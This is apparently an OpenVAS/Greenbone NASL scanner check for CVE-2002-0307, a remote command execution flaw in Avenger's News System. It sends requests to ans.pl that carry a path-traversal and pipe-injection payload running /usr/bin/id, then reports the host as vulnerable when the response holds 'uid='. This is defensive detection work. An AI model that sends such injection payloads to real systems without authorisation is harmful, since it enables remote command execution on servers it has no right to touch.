# SPDX-FileCopyrightText: 2002 SecurITeam
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10875");
  script_version("2023-08-01T13:29:10+0000");
  script_cve_id("CVE-2002-0307");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-08-01 13:29:10 +0000 (Tue, 01 Aug 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_name("Avenger's News System Command Execution");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2002 SecurITeam");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.securiteam.com/unixfocus/5MP090A6KG.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/4147");

  script_tag(name:"solution", value:"See the referenced link on how to update the affected code
  to fix this vulnerability.");

  script_tag(name:"summary", value:"A security vulnerability in Avenger's News System (ANS) allows
  command execution by remote attackers who have access to the ANS page.");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"Mitigation");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port( default:80 );

foreach dir( make_list_unique( "/", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" )
    dir = "";

  foreach url( make_list( dir + "/ans.pl?p=../../../../../usr/bin/id|&blah",
                          dir + "/ans/ans.pl?p=../../../../../usr/bin/id|&blah" ) ) {

    req = http_get( item:url, port:port );
    buf = http_keepalive_send_recv( port:port, data:req );

    if( "uid=" >< buf && "groups=" >< buf ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
